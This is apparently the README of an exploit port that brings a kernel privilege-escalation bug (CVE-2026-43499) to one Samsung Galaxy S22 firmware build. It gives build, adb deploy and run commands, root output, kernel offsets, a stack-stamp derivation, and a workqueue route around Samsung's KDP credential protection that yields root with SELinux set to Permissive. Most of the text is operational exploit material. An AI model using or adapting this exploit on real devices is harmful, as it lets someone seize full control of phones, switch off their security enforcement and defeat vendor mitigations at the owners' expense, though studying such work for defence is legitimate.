# Port: Galaxy S22 (SM-S901E) — `S901EXXSAEXF8`

Device-specific port of the CVE-2026-43499 (IonStack / "GhostLock") exploit to
the **Qualcomm** Galaxy S22 `r0q` on the **Android 14 / June 2024** firmware.
This is a *different* build from every target shipped upstream: same SoC family
as `S901WVLS4DWL3` (S22 Canada, Android 14), but a newer kernel with different
symbols, a different stack frame layout in `do_ipv6_setsockopt`, and a KDP
protected `struct cred`.

Verified end-to-end on hardware: `uid=0(root)`, `u:r:kernel:s0`,
SELinux `Permissive`, from `adb shell` uid 2000.

```text
Device: Samsung Galaxy S22 (SM-S901E)
Codename: r0q (taro / Snapdragon 8 Gen 1, SM8450)
Android: 14 / SDK 34
Build number: UP1A.231005.007.S901EXXSAEXF8
Build fingerprint: samsung/r0qxxx/r0q:14/UP1A.231005.007/S901EXXSAEXF8:user/release-keys
Kernel: 5.10.198-android12-9-28575149-abS901EXXSAEXF8
Kernel built: Tue Jun 25 08:17:48 UTC 2024
Security patch level: 2024-07-01
Page size: 4096
VA_BITS: 39 (linear map is 64 GB; RAM has a bank above 4 GB)
```

Firmware provenance used to generate offsets (not shipped):

```text
boot.img   100663296 bytes  sha256 f823489fce2c94cee5008804741e07ec7dcb66bca899e8d8d87a39f3bf31e28d
Image       41345536 bytes  sha256 834fea41a8fb1efa85939c0b45304cd298d251eecf76f60506ef18106121b2e0
```

`firmware/extracted/Image` is sliced from `boot.img` at 0x1000; `_text` is not
exported by this kernel (`_stext` = `_text + 0x10000`), so the generator falls
back to `KIMAGE_TEXT_BASE = 0xffffffc008000000`.

## Build

```sh
export ANDROID_NDK_HOME=/path/to/android-ndk
# macOS host tag (Linux hosts use the default linux-x86_64):
export NDK_HOST_TAG=darwin-x86_64

make PROJECT=S901EXXSAEXF8 clean preload root-helper
```

Outputs (checksums from the verified build):

```text
build/S901EXXSAEXF8/bin/cve-2026-43499        9145352 bytes  sha256 e601c8f448100556b4621ea62ca060e106f17db88843ae5f1e8c00155831cc68
build/S901EXXSAEXF8/bin/cve-2026-43499-root     14528 bytes  sha256 ebae10d238e1d4a4239bba716a62c0ebf21b731c29c98fd0c7ceef914a7e3d9d
build/S901EXXSAEXF8/bin/cve-exp64             9026568 bytes  sha256 76deaabf2eea03e0f612091e882046a9a0da946247610d39d59dd49e87494b29
```

## Deploy

```sh
TARGET=S901EXXSAEXF8
adb push build/$TARGET/bin/cve-2026-43499        /data/local/tmp/cve-2026-43499
adb push build/$TARGET/bin/cve-2026-43499-root   /data/local/tmp/cve-2026-43499-root
adb push build/$TARGET/bin/cve-exp64             /data/local/tmp/cve-exp64
adb shell chmod 755 /data/local/tmp/cve-2026-43499 /data/local/tmp/cve-2026-43499-root /data/local/tmp/cve-exp64
```

## Run

```sh
adb shell "EXPLOIT_ATTEMPTS=6 LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true"
adb shell "/data/local/tmp/cve-2026-43499-root -c 'id; getenforce'"
```

Verified output:

```text
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
Permissive
```

and from the exploit itself:

```text
[*] root umh selinux enforcing byte 0 -> 0 (addr=ffffff802aa81a70)
[*] root umh probe wq_slot=ffffff802a741e00 wq=ffffff87bb10a800
[*] root umh probe cpu_pwqs=ffffffc00a72cc00 per_cpu0=ffffffc8f3929000 pwq=ffffff88fe055c00
[*] root umh probe pool=ffffff88fe050780 pwq_wq=ffffff87bb10a800
[*] root umh queued wq=ffffff87bb10a800 pwq=ffffff88fe055c00 pool=ffffff88fe050780
    work=ffffff8038ad6000 entry=ffffff8038ad6008 color=0 counters=0/0/1 writes=1/1/1/1/1
[*] root umh result wake=1 complete=1 retval=0 socket=1
```

## Porting notes (what differed from `S901WVLS4DWL3`)

### 1. `_text` is not exported → `generate_target.py`

Samsung 5.10 kernels export `_stext` only; using it as the image base shifts
every offset by 0x10000. The generator now falls back to
`KIMAGE_TEXT_BASE = 0xffffffc008000000` when `_text` is missing.

### 2. exp64 must not be static PIE

The NDK-built `-static-pie` stage segfaulted before `main` on this kernel
(empty crash buffer, `rc=139`). Plain `-static` runs fine.

`src/targets/S901EXXSAEXF8/no-static-pie` makes the Makefile link the 64-bit
stage as a non-PIE static ELF for this target only.

### 3. The stack stamp had to be re-derived (this was the panic)

The upstream `S901WVLS4DWL3` target stamps the stale `rt_mutex_waiter` with the
native `do_ipv6_setsockopt` `MCAST_JOIN_SOURCE_GROUP` copy. On `S901EXXSAEXF8`
the compiler placed that buffer at `sp+0x58` (frame 0x2e0), which lands at stack
depth **0x358** — *below* the stale waiter at **0x1f0** — so no `STAMP_OFF` can
reach it. The compat branch (buffer at `sp+0x168`) is unreachable because
`__arm64_compat_sys_setsockopt` is an `ENOSYS` stub (`mov x0, #-0x26`).

Derived from the shipped `Image` with `target_generator/disas_frames.py`:

```text
futex_wait_requeue_pi:  sub sp, sp, #0x1a0 ; add x27, sp, #0x90   → waiter = top-0x1f0
rt_sigreturn chain:     __arm64_sys_rt_sigreturn  0x50
                        restore_sigframe          0x60
                        restore_fpsimd_context    0x250
                        copy_from_user(sp, vregs, 0x200)          → buffer = top-0x300
STAMP_OFF = 0x300 - 0x1f0 = 0x110
```

`exp64/stack.c` now raises `SIGUSR1` on the waiter thread; the handler rewrites
its own sigframe's FPSIMD record (`magic 0x46508001`, `size 0x210`, vregs at
+0x10) and `rt_sigreturn` performs the kernel-stack copy. No syscalls after the
stamp, as required.

### 4. Linear map is 64 GB, with a RAM bank above 4 GB

`DIRECT_MAP_END` / `KERNELSNITCH_IDENTITY_END` were sized for 8 GB. Kernel
pointers such as `system_wq` (`0xffffff87bb10a800`) are valid direct-map
addresses well above 8 GB, so `is_direct_ptr()` rejected them and the second
Kernelsnitch pass could not find the mm_struct (best partial match 2/5 instead
of 5/5). Both are now `0xffffff9000000000` (64 GB, matching `VA_BITS=39`).

### 5. Pipe-stage leak retry

`prepare_pipe_buffer_page_child()` now leaks the mm address *before* any page
choreography, and retries with a fresh leak child (fresh Kernelsnitch state)
when the collision set is inconsistent. The address is pure slab arithmetic, so
it stays valid after the page is freed and reclaimed by the skb.

The two 64-bit proof steps are also no longer fatal: the byte-wise read/write
proofs are what the root path needs, and the per-buffer `read64` path is flaky
on this build.

### 6. KDP makes `struct cred` unwritable — do not patch it

This device runs Samsung RKP/KDP. `struct cred` (and `task_security_struct`,
mount superblocks, `selinux` state, ...) lives on hypervisor-owned read-only
pages; `cred` also carries DFI back-pointers (`bp_task`, `bp_pgd`, `use_cnt`).
Every attempt to zero the uid fields — or to swap `task->cred` for `init_cred` —
faults in the hypervisor and reboots the phone. That is not a wrong offset, it
is the mitigation working.

References:

- Impalabs, *A Samsung RKP Compendium* — "KDP … makes sensitive kernel data
  structures (like the page tables, `struct cred`, `struct task_security_struct`,
  `struct vfsmount`, SELinux status, etc.) read-only thanks to the hypervisor."
- Jamf Threat Labs, *Samsung Kernel Protections Bypassed via GPU DMA*.

### 7. Root escalation: KDP-safe usermodehelper workqueue

The working route queues `call_usermodehelper_exec_work` (via
`system_unbound_wq`/`system_wq`) so a kworker with kernel credentials execs the
root helper. `CONFIG_STATIC_USERMODEHELPER=y` with an empty path rules out
`modprobe_path` / `core_pattern`, and direct cred patching is blocked by KDP.

The upstream target used `wq->dfl_pwq` at +0xb0, which is **not** what
`__queue_work()` uses:

- unbound wq → `wq->numa_pwq_tbl[node]`
- bound wq   → `raw_cpu_ptr(wq->cpu_pwqs)`

Disassembly of this build's `__queue_work`:

```text
0xffffffc00810b408: ldr x8, [x23, #0x108]      ; wq->cpu_pwqs
0xffffffc00810b40c: ldr x9, [x1, w25, uxtw #3] ; __per_cpu_offset[cpu]
0xffffffc00810b414: add x22, x9, x8            ; pwq
```

So the port uses the *bound* `system_wq`:

```text
pwq = *(system_wq + 0x108) + __per_cpu_offset[0]
```

`pool_workqueue`/`worker_pool` offsets were re-verified against
`pwq_dec_nr_in_flight` in the same `Image`
(`nr_in_flight` 0x1c, `nr_active` 0x58, `max_active` 0x5c, `pool->worklist` 0x20,
`pool->nr_idle` 0x34). New defines in `target.h`:

```c
#define SYSTEM_WQ_OFF          0x02569e00ULL
#define WQ_CPU_PWQS_OFF        0x108ULL
#define PER_CPU_OFFSET_OFF     0x0256a558ULL
```

The queued work struct lives at `page_base + ROOT_UMH_WORK_OFF` (the reclaimed
order-3 page that already holds the fake fops), with the `subprocess_info`
pointing at the helper path.

## Caveats

- **Volatile root only.** Reboot removes root and the SELinux change; re-run the
  exploit after every boot. Nothing is flashed.
- The futex race is timing sensitive and can still panic the kernel. A clean
  boot, idle unlocked screen, and no background apps give the best odds; the
  supervisor retries in fresh processes.
- Exact build only: `SM-S901E` on `S901EXXSAEXF8`. Other firmware (including
  `S901EXXSEGZE3`, Android 16) needs its own generated target and a fresh
  stack-stamp derivation.
- `KERNELSNITCH_VERBOSE=1` / `KSNITCH_VERBOSE=1` add diagnostics.

## Files

```text
src/targets/S901EXXSAEXF8/target.h          generated offsets + wq/uapi layout
src/targets/S901EXXSAEXF8/exp64/stack.c     sigreturn-FPSIMD stamp (0x110)
src/targets/S901EXXSAEXF8/root.c            KDP-safe workqueue umh + cred walk
src/targets/S901EXXSAEXF8/fops.c            install_child_root() -> umh
src/targets/S901EXXSAEXF8/no-static-pie     defuses static-PIE exp64
src/targets/S901EXXSAEXF8/*                 copied from S901WVLS4DWL3, adjusted
Makefile                                    per-target no-static-pie mode
src/kernelsnitch/kernelsnitch.h             collision confirm + best-match stats
src/pipe.c                                  leak-before-choreography + retry
target_generator/generate_target.py         _text fallback
target_generator/disas_frames.py            frame/offset derivation helper
```
